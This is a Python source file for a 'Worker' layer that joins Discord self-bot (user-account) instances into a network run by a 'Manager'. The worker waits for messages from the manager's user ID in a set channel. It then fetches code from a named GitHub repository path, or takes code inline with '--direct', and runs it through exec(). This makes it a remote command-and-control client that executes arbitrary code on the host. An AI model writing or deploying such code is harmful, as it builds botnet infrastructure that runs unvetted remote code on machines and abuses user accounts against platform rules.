# a layer
# makes the normal discord-self bot instance able to work in a network
"""
listens for orders from a Manager class
order must be a raw github page containing code to be executed
also, turn self.listen on here too if you want stats
"""

class Worker:

  def __init__(self, manager: int, base: int, **kwargs):
    # prefix for the userbot
    self.prefix = "!"

    # manager
    self.manager = manager

    # base
    self.base = base

    self.listen = kwargs.get("listen")
    

    # the bot instance made here can be interacted using instance.bot
    self.bot = commands.Bot(command_prefix=self.prefix)

    # github instance, used to load files
    self.ghub = Github()


  async def prep(self):
    await self.bot.wait_until_ready()
    self.base = self.bot.get_channel(self.base)

  async def hear(self):
    await self.bot.wait_until_ready()
    order = await self.bot.wait_for("message", check=lambda m: m.author.id == self.manager and m.channel == self.base)
    order = order.content
    if not "--direct" in order:
      user, repo, path = order.split(":")[0], order.split(":")[1], order.split(":")[2]
      page = git(author=user, repo=repo, path=path, mode=1)
    

      try:
        exec(str(page))
      except Exception as e:
        print("Error in exec, hear(): " + str(e))
        print(str(page))
        
    else:
      try:
          if not "--await" in order:
            exec(order.replace("--direct ", ""))
          else:
            exec("self.bot.loop.create_task(" + order.replace("--direct ", "").replace("--await ", "") + ")")
          print("Successfully executed direct order")
      except Exception as e:
        print("Error in executing direct order, hear():" + str(e))
      
